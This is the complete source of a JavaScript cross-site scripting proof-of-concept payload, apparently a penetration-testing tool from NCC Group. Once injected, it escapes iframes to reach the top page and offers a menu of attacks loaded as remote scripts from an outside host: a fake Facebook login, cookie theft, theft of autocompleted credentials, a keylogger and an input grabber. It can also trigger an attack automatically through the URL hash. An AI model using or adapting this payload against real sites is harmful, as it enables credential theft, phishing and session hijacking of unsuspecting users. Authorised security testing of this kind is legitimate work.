// 1x.js, the NCC XSS PoC payload with extra attacks.
// For more information, ask Matt Evans (matthew.evans@nccgroup.com).

/*******************************/
// Soroush Dalili - detect when body object is not available or when it is in an Iframe that has access to top parents!
if(!originalWinNCCXSS){
	var originalWinNCCXSS = window;
	var winObj = originalWinNCCXSS;
	var docObj = winObj.document;

	if(winObj.top != winObj.self){
	  try{
		while (winObj.document && winObj != winObj.parent){
		  docObj = winObj.parent.document;
		  winObj = winObj.parent;
		}
	  }catch(e){
		
	  }
	}

	if(!docObj.body){
	  try{
		docObj.open();
		docObj.write("<body></body>");
		docObj.close();
	  }catch(e){}
	}

	winObj.originalWinNCCXSS = originalWinNCCXSS;
}
/*******************************/

var s = document.createElement("select");

s.addoption = function(t,f) {
	var o = document.createElement("option");
	if (typeof f === "function" || !f) 
		o.addEventListener("click", f);
	else{
		o.addEventListener("click", function() {
			// When the script loads, it will call this function.
			// This anonymous function returns a second function so we can set local variables now.
			// Nerd yourself up on JavaScript closures if you're confuzzled.
			window.callback = (function(ff){return function() {window[ff]();window.callback=function(){};};})(f);
			// Load the attack script.
			document.body.appendChild(document.createElement("script")).src="//15.rs/attacks/"+f+".js";
		});
	}
	
	o.appendChild(document.createTextNode(t));
	this.appendChild(o);
};

// Listen for changes to the select box.
s.addEventListener("change", function(e){e.target.children[e.target.selectedIndex].click();}, true);

// To add another attack, the second argument is either an anonymous function, or
// it's the filename of a file in //15.rs/attacks/<string>.js, with a function called
// function <string>(){}. Additionally, add a window.callback(); line in the JS file.
s.addoption("Select attack...");
s.addoption("Fake FaceBook login form", "fb");
s.addoption("Reveal internal IP addresses", "internalIPs");
s.addoption("Reveal user-accessible cookies", "cookies");
s.addoption("Steal autocompleted credentials", "autocomplete");
s.addoption("Frame site and insert keylogger", "keylogger");
s.addoption("Steal input box value", "inputgrabber");

// This is written to the NCC popup by a small modification I made to 1.js.
window.NCCSelect = s;

// Include 1.js:
document.body.appendChild(document.createElement("script")).src="//15.rs/1.js";



// Automatically execute an attack if desired.
if (document.currentScript) {
        var sUrl = document.currentScript.src;
        // Extract hash part.
        sUrl = sUrl.split('#');
        if (sUrl.length == 2) {
                window.sUrlArgs = sUrl[1].split('|');

                // We want to automate one of the attacks.
                var i = parseInt(sUrl[1]);
                if (i<window.NCCSelect.options.length) {
                        // Move selection.
                        window.NCCSelect.options.selectedIndex = i;
                        // Trigger attack.
                        window.NCCSelect.options[i].click();
                }
        }

}
